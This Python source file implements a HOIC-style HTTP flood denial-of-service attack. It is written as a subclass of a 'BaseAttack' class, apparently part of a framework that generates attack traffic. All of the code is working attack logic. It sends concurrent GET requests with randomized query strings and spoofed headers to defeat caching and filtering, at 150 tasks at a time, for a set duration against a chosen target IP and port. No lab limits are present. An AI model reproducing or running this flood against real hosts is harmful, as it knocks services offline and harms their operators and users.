"""HOIC DDoS attack implementation"""

import asyncio
import aiohttp
import logging
import random
import string
from .base_attack import BaseAttack

logger = logging.getLogger(__name__)


class DDosHOIC(BaseAttack):
    """HOIC (High Orbit Ion Cannon) DDoS attack"""
    
    def get_attack_type(self) -> str:
        return "DDOS attack-HOIC"
    
    def get_default_port(self) -> int:
        return 80
    
    def _random_string(self, length=10):
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    async def _send_request(self, session, url):
        """Send randomized HTTP request"""
        headers = {
            'User-Agent': f'Mozilla/5.0 {self._random_string()}',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': f'http://{self.target_ip}/{self._random_string()}',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
        # Randomize URL
        random_url = f"{url}?{self._random_string(20)}"
        
        try:
            async with session.get(random_url, headers=headers, timeout=5) as response:
                await response.read()
                self.packets_sent += 1
        except Exception:
            pass
    
    async def _execute_attack(self):
        """Execute HOIC attack"""
        port = self.target_port or self.get_default_port()
        duration = self.parameters.get('duration', 300)
        threads = self.parameters.get('threads', 150)
        
        url = f"http://{self.target_ip}:{port}/"
        
        logger.info(f"HOIC: Starting attack on {url} with {threads} threads")
        
        connector = aiohttp.TCPConnector(limit=threads)
        async with aiohttp.ClientSession(connector=connector) as session:
            start_time = asyncio.get_event_loop().time()
            
            while (asyncio.get_event_loop().time() - start_time) < duration:
                tasks = [self._send_request(session, url) for _ in range(threads)]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                if self.packets_sent % 5000 == 0:
                    logger.info(f"HOIC: Sent {self.packets_sent} requests")
        
        logger.info(f"HOIC: Attack complete. Total: {self.packets_sent} requests")

